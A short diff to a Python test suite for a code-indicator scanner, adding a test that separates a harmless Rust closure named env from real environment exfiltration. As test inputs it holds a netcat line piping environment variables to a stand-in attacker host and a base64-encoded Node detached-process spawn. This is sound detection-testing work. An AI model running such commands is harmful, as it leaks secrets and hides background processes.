@@ -367,3 +367,10 @@ def test_base64_deobfuscation_reaches_the_js_primitives():
     blob = base64.b64encode(b"require('child_process').spawn(p,a,{detached: true}).unref()").decode()
     obf = [h for h in scan_indicators(f"const s = '{blob}';") if h.rule == "obfuscated-payload"]
     assert obf and obf[0].severity == "high"
+
+
+def test_a_rust_closure_named_env_is_not_an_environment_dump():
+    from diff_sentry.indicators import scan_indicators
+
+    assert not [h for h in scan_indicators(".filter_map(|env| self.getenv(env))") if h.rule == "data-exfiltration"]
+    assert [h for h in scan_indicators("cat x | env | nc evil.example 4444") if h.rule == "data-exfiltration"]
